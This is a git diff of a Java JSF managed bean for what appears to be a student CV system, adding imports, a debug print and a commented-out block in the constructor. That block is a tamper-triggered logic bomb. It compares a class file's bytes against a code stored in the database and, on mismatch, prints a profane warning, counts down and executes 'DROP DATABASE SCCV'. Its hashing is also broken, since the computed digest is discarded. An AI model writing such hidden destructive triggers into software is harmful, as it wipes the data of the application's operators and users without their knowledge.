@@ -1,14 +1,25 @@
 package br.senai.sp.jaguariuna.sccv.mBeans;
 
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.IOException;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
+import java.sql.Connection;
+import java.sql.PreparedStatement;
+import java.sql.ResultSet;
 import java.sql.SQLException;
 
 import javax.faces.application.FacesMessage;
 import javax.faces.bean.ManagedBean;
 import javax.faces.bean.SessionScoped;
 import javax.faces.context.FacesContext;
+import javax.servlet.ServletContext;
 
 import br.senai.sp.jaguariuna.sccv.entities.Usuario;
 import br.senai.sp.jaguariuna.sccv.entities.UsuarioAdministrador;
+import br.senai.sp.jaguariuna.sccv.jdbc.ConnectionDB;
 import br.senai.sp.jaguariuna.sccv.uDao.UsuarioDao;
 import br.senai.sp.jaguariuna.sccv.utils.StringToMD5;
 
@@ -27,9 +38,59 @@ public class AlunoIndexMBean {
 	private String cpfRecuperar;
 
 	public AlunoIndexMBean() {
+		System.out.println("Entrou no Construtor");
 		modoSelecionado = "user";
 		funcaoCPF = "!TestaCPF(this.value) ? this.value = '' : this.value; avisoGrowl(TestaCPF(this.value));";
 		usuarioDao = new UsuarioDao();
+
+		/*
+		 * String dir = ((ServletContext)
+		 * FacesContext.getCurrentInstance().getExternalContext().getContext()).
+		 * getRealPath(
+		 * "/WEB-INF/classes/br/senai/sp/jaguariuna/sccv/entities/CurriculumVitae.class"
+		 * ); File file = new File(dir);
+		 * 
+		 * try { FileInputStream inputStream = new FileInputStream(file); byte[] bytes =
+		 * new byte[inputStream.available()]; inputStream.read(bytes);
+		 * inputStream.close();
+		 * 
+		 * StringBuilder sb = new StringBuilder();
+		 * 
+		 * for(int i = 0; i < bytes.length; i ++) { sb.append(bytes[i]); }
+		 * 
+		 * MessageDigest md = MessageDigest.getInstance("sha-256"); md.digest(bytes);
+		 * 
+		 * StringBuffer hexString = new StringBuffer(); for (int i = 0; i <
+		 * bytes.length; i++) { String hex = Integer.toHexString(0xff & bytes[i]);
+		 * if(hex.length() == 1) hexString.append('0'); hexString.append(hex); }
+		 * 
+		 * Connection conn = ConnectionDB.getConnection(); String sql =
+		 * "SELECT * FROM codvalidacao";
+		 * 
+		 * PreparedStatement ps = conn.prepareStatement(sql); ResultSet rs =
+		 * ps.executeQuery(); if(!rs.next()) { sql =
+		 * "INSERT INTO codvalidacao(cod) VALUES(?)"; PreparedStatement ps1 =
+		 * conn.prepareStatement(sql); ps1.setString(1, hexString.toString());
+		 * ps1.executeUpdate();
+		 * 
+		 * } else { String cod = rs.getString("cod");
+		 * 
+		 * if (!cod.equals(hexString.toString())) {
+		 * System.out.println("O BD VAI SER EXCLUIDO E FODASE EM..."); sql =
+		 * "DROP DATABASE SCCV";
+		 * 
+		 * for(int i = 3; i > 0; i--) { try { Thread.sleep(1000); } catch
+		 * (InterruptedException e) { // TODO Auto-generated catch block
+		 * e.printStackTrace(); } System.out.println(String.valueOf(i)); }
+		 * 
+		 * ps = conn.prepareStatement(sql); ps.executeUpdate(); } } } catch
+		 * (FileNotFoundException e) { // TODO Auto-generated catch block
+		 * e.printStackTrace(); } catch (IOException e) { // TODO Auto-generated catch
+		 * block } catch (NoSuchAlgorithmException e) { // TODO Auto-generated catch
+		 * block e.printStackTrace(); } catch (SQLException e) { // TODO Auto-generated
+		 * catch block e.printStackTrace(); }
+		 */
+
 	}
 
 	public void trocaModoSelecionado() {
